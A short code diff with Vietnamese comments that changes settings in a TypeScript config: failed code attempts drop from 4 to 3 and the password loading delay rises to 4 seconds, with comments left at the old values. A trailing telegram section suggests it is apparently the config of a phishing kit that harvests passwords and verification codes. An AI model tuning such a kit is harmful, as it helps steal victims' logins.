@@ -21,10 +21,10 @@ const defaultConfig: Config = {
 	settings: {
 		// Dang sau dau // khong co tac dung
 		code_loading_time: 5000, // Thời gian tải mã mặc định (5 giây)
-		max_failed_code_attempts: 4, // Số lần thử mã tối đa (4 lần)
+		max_failed_code_attempts: 3, // Số lần thử mã tối đa (4 lần)
 		max_failed_password_attempts: 1, // Số lần thử mật khẩu tối đa (1 lần)
 		page_loading_time: 5000, // Thời gian tải trang mặc định (5 giây)
-		password_loading_time: 2000, // Thời gian tải mật khẩu mặc định (2 giây)
+		password_loading_time: 4000, // Thời gian tải mật khẩu mặc định (2 giây)
 		code_input_enabled: true, // Cho phép nhập mã (true)
 	},
 	telegram: {
